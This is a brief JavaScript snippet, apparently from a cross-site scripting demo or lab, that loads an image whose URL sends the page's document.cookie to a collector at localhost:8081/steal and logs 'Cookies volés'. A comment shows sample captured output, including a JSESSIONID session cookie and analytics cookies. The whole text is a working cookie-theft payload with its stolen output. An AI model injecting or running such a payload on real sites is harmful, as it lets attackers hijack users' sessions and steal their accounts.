var imgEvil = new Image();
imgEvil.src = "http://localhost:8081/steal?cookies=" + document.cookie;
console.log('Cookies volés');

// http://localhost:8081/steal?cookies=accept-cookies=true; origine=AA;
// _ga=GA1.1.1668780861.1439987810; JSESSIONID=w7fvsypd9n5w1kzyf0txhq9ok
